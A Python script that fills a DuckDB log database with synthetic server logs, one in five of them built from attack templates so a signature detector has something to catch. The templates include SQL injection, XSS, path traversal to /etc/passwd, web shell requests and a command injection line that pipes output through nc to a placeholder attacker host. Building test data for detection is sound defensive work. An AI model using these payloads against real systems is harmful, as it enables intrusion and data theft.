import sys
import os
import time
import random
import json
import uuid
import duckdb
from datetime import datetime, timedelta

# Add backend to path to import models if needed, but we'll use direct SQL for simplicity and speed
sys.path.append(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'backend'))

DB_PATH = "data/duckdb/logs.db"

# Sample data for generation
HOSTS = [f"server-{i:02d}" for i in range(1, 21)]
APPS = ["sshd", "nginx", "apache2", "mysql", "postgresql", "kernel", "systemd", "cron", "auth"]
USERS = ["root", "admin", "user", "deploy", "backup", "guest", "ubuntu", "ec2-user"]
IPS = [f"192.168.1.{i}" for i in range(1, 255)] + [f"10.0.0.{i}" for i in range(1, 255)]

# Include some blocked IPs from our threat intel
BLOCKED_IPS = [
    "192.0.2.1", "198.51.100.1", "203.0.113.1", 
    "185.220.101.1", "185.220.101.2", "45.142.212.61"
]

EXTERNAL_IPS = [f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}" for _ in range(50)]

# Normal messages (80% of traffic)
NORMAL_MESSAGES = {
    "sshd": [
        "Accepted publickey for {user} from {ip} port {port} ssh2",
        "Disconnected from {ip} port {port}",
        "Connection closed by {ip} port {port}",
        "Session opened for user {user} by (uid=0)"
    ],
    "nginx": [
        '{ip} - - [{timestamp}] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0"',
        '{ip} - - [{timestamp}] "GET /api/status HTTP/1.1" 200 124 "-" "curl/7.68.0"',
        '{ip} - - [{timestamp}] "GET /static/style.css HTTP/1.1" 200 1456 "http://example.com" "Mozilla/5.0"',
        '{ip} - - [{timestamp}] "POST /api/data HTTP/1.1" 201 45 "-" "axios/0.21.1"'
    ],
    "apache2": [
        '{ip} - - [{timestamp}] "GET /index.html HTTP/1.1" 200 2326',
        '{ip} - - [{timestamp}] "GET /images/logo.png HTTP/1.1" 200 5432',
        '{ip} - - [{timestamp}] "POST /contact HTTP/1.1" 200 156'
    ],
    "kernel": [
        "UFW ALLOW: IN=eth0 OUT= SRC={ip} DST=192.168.1.1 PROTO=TCP SPT={port} DPT=80",
        "systemd[1]: Started Session {pid} of user {user}",
    ],
    "mysql": [
        "[Note] Access granted for user '{user}'@'{ip}'",
        "[Note] Query executed successfully for user '{user}'",
    ]
}

# Attack patterns (20% of traffic) - These will trigger signature detection
ATTACK_MESSAGES = {
    # SQL Injection attacks
    "sql_injection": [
        r'{ip} - - [{timestamp}] "GET /search?q=\' OR 1=1-- HTTP/1.1" 200 1234',
        r'{ip} - - [{timestamp}] "POST /login HTTP/1.1" 401 124 "username=admin\' OR \'1\'=\'1&password=test"',
        '{ip} - - [{timestamp}] "GET /product?id=1 UNION SELECT * FROM users-- HTTP/1.1" 500 234',
        '{ip} - - [{timestamp}] "GET /api/user?id=1; DROP TABLE users;-- HTTP/1.1" 500 89',
    ],
    
    # XSS attacks
    "xss": [
        '{ip} - - [{timestamp}] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 456',
        '{ip} - - [{timestamp}] "POST /comment HTTP/1.1" 200 234 "content=<img src=x onerror=alert(1)>"',
        '{ip} - - [{timestamp}] "GET /page?name=<svg/onload=alert(document.cookie)> HTTP/1.1" 200 567',
    ],
    
    # SSH Brute Force
    "ssh_brute_force": [
        "Failed password for {user} from {ip} port {port} ssh2",
        "Failed password for invalid user admin from {ip} port {port} ssh2",
        "Invalid user {user} from {ip}",
        "Failed password for root from {ip} port {port} ssh2",
        "Authentication failure for {user} from {ip}",
    ],
    
    # Path Traversal
    "path_traversal": [
        '{ip} - - [{timestamp}] "GET /download?file=../../../etc/passwd HTTP/1.1" 403 124',
        r'{ip} - - [{timestamp}] "GET /files?path=..\\..\\..\\windows\\system32\\config\\sam HTTP/1.1" 403 89',
        '{ip} - - [{timestamp}] "GET /view?page=....//....//....//etc/shadow HTTP/1.1" 403 67',
    ],
    
    # Command Injection
    "command_injection": [
        '{ip} - - [{timestamp}] "GET /ping?host=8.8.8.8;cat /etc/passwd HTTP/1.1" 500 234',
        '{ip} - - [{timestamp}] "POST /exec HTTP/1.1" 500 123 "cmd=ls | nc attacker.com 4444"',
        '{ip} - - [{timestamp}] "GET /run?cmd=$(whoami) HTTP/1.1" 500 89',
    ],
    
    # Port Scanning
    "port_scan": [
        "UFW BLOCK: IN=eth0 OUT= SRC={ip} DST=192.168.1.1 PROTO=TCP SPT={port} DPT=22",
        "UFW BLOCK: IN=eth0 OUT= SRC={ip} DST=192.168.1.1 PROTO=TCP SPT={port} DPT=23",
        "UFW BLOCK: IN=eth0 OUT= SRC={ip} DST=192.168.1.1 PROTO=TCP SPT={port} DPT=3389",
        "UFW BLOCK: IN=eth0 OUT= SRC={ip} DST=192.168.1.1 PROTO=TCP SPT={port} DPT=445",
    ],
    
    # Malware/Backdoor
    "malware": [
        "Process mimikatz.exe detected on {host}",
        "Suspicious file hash detected: ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
        "Cobalt Strike beacon detected from {ip}",
        "Reverse shell connection attempt to {ip}:4444",
    ],
    
    # Privilege Escalation
    "privilege_escalation": [
        "sudo: {user} : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash",
        "User {user} attempted to execute /etc/shadow",
        "SUID binary /usr/bin/passwd executed by {user}",
    ],
    
    # Blocked IP connections
    "blocked_ip": [
        "Connection attempt from blocked IP {ip}",
        "Firewall blocked connection from {ip} to port {port}",
        "Denied access from known malicious IP {ip}",
    ],
    
    # Web Shell
    "web_shell": [
        '{ip} - - [{timestamp}] "POST /uploads/shell.php HTTP/1.1" 200 45 "cmd=whoami"',
        '{ip} - - [{timestamp}] "GET /wp-content/uploads/c99.php?cmd=ls HTTP/1.1" 200 234',
    ],
    
    # LDAP Injection
    "ldap_injection": [
        r'{ip} - - [{timestamp}] "POST /auth HTTP/1.1" 401 123 "username=*)(uid=*))(|(uid=*&password=test"',
    ],
}


def connect_db():
    """Connect to DuckDB database"""
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    return duckdb.connect(DB_PATH)


def create_log_entry(app, host, ip, user, port, pid, message):
    """Create a log entry dictionary"""
    log_id = str(uuid.uuid4())
    timestamp = datetime.now().isoformat()
    
    # Normalized data
    normalized = {
        "timestamp": timestamp,
        "appname": app,
        "host": host,
        "message": message,
        "source_ip": ip,
        "user": user if app in ["sshd", "auth"] else None
    }
    
    return {
        "id": log_id,
        "timestamp": timestamp,
        "raw": f"{timestamp} {host} {app}[{pid}]: {message}",
        "appname": app,
        "file": f"/var/log/{app}.log",
        "host": host,
        "hostname": host,
        "message": message,
        "procid": pid,
        "source_type": "file",
        "normalized": json.dumps(normalized),
        "metadata": json.dumps({"environment": "production", "region": "us-east-1"}),
        "ingestion_time": datetime.now()
    }


def generate_attack_log():
    """Generate a log that will trigger signature detection"""
    attack_type = random.choice(list(ATTACK_MESSAGES.keys()))
    messages = ATTACK_MESSAGES[attack_type]
    
    # Use blocked IPs for some attacks
    if attack_type == "blocked_ip" or random.random() < 0.3:
        ip = random.choice(BLOCKED_IPS)
    else:
        ip = random.choice(EXTERNAL_IPS)
    
    # Determine app based on attack type
    if attack_type in ["sql_injection", "xss", "path_traversal", "command_injection", "web_shell", "ldap_injection"]:
        app = random.choice(["nginx", "apache2"])
    elif attack_type == "ssh_brute_force":
        app = "sshd"
    elif attack_type == "port_scan":
        app = "kernel"
    elif attack_type in ["malware", "privilege_escalation"]:
        app = random.choice(["systemd", "kernel", "auth"])
    else:
        app = random.choice(["nginx", "apache2", "sshd"])
    
    host = random.choice(HOSTS)
    user = random.choice(USERS)
    port = random.randint(1024, 65535)
    pid = random.randint(1000, 99999)
    timestamp_str = datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")
    
    template = random.choice(messages)
    message = template.format(
        user=user, ip=ip, port=port, pid=pid, timestamp=timestamp_str, host=host
    )
    
    return create_log_entry(app, host, ip, user, port, pid, message)


def generate_normal_log():
    """Generate a normal log entry"""
    app = random.choice(list(NORMAL_MESSAGES.keys()))
    host = random.choice(HOSTS)
    
    # Normal traffic uses internal IPs mostly
    if random.random() < 0.8:
        ip = random.choice(IPS)
    else:
        ip = random.choice(EXTERNAL_IPS)
    
    user = random.choice(USERS)
    port = random.randint(1024, 65535)
    pid = random.randint(1000, 99999)
    timestamp_str = datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")
    
    template = random.choice(NORMAL_MESSAGES[app])
    message = template.format(
        user=user, ip=ip, port=port, pid=pid, timestamp=timestamp_str
    )
    
    return create_log_entry(app, host, ip, user, port, pid, message)


def generate_log():
    """Generate a log - 20% attacks, 80% normal"""
    if random.random() < 0.2:  # 20% attack traffic
        return generate_attack_log()
    else:  # 80% normal traffic
        return generate_normal_log()


def seed_logs(batch_size=10, interval=1.0):
    """Main seeder function"""
    print(f"Starting ENHANCED log seeder with attack patterns. Writing to {DB_PATH}")
    print(f"Batch size: {batch_size}, Interval: {interval}s")
    print(f"Attack ratio: ~20% (will trigger signature detection)")
    print("Press Ctrl+C to stop")
    print("Note: Connection is opened/closed per batch to allow concurrent access")
    print()
    
    attack_count = 0
    normal_count = 0
    
    try:
        while True:
            # Open connection for this batch
            conn = connect_db()
            
            try:
                logs = []
                batch_attacks = 0
                
                for _ in range(batch_size):
                    log = generate_log()
                    logs.append(log)
                    # Count attacks in this batch
                    if any(pattern in log["message"].lower() for pattern in 
                           ["failed password", "sql", "script", "union", "etc/passwd", 
                            "mimikatz", "shell.php", "blocked", "drop table", "xss"]):
                        batch_attacks += 1
                
                attack_count += batch_attacks
                normal_count += (batch_size - batch_attacks)
                
                # Prepare data for insertion
                data = []
                for log in logs:
                    data.append((
                        log["id"], log["timestamp"], log["raw"], log["appname"], 
                        log["file"], log["host"], log["hostname"], log["message"], 
                        log["procid"], log["source_type"], log["normalized"], 
                        log["metadata"], log["ingestion_time"]
                    ))
                
                # Insert batch
                placeholders = "(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
                conn.executemany(f"""
                    INSERT INTO logs (
                        id, timestamp, raw, appname, file, host, hostname, 
                        message, procid, source_type, normalized, metadata, ingestion_time
                    ) VALUES {placeholders}
                """, data)
                
                print(f"[{datetime.now().strftime('%H:%M:%S')}] Inserted {batch_size} logs ({batch_attacks} attacks, {batch_size - batch_attacks} normal) | Total: {attack_count} attacks, {normal_count} normal")
                
            finally:
                # Close connection after each batch to allow other processes to access
                conn.close()
            
            time.sleep(interval)
            
    except KeyboardInterrupt:
        print("\n\nStopping seeder...")
        print(f"Final stats: {attack_count} attack logs, {normal_count} normal logs")
    except Exception as e:
        print(f"\nError: {e}")
        import traceback
        traceback.print_exc()
    finally:
        print("Seeder stopped")


if __name__ == "__main__":
    # Optional arguments: batch_size, interval
    batch_size = int(sys.argv[1]) if len(sys.argv) > 1 else 5
    interval = float(sys.argv[2]) if len(sys.argv) > 2 else 2.0
    
    seed_logs(batch_size, interval)
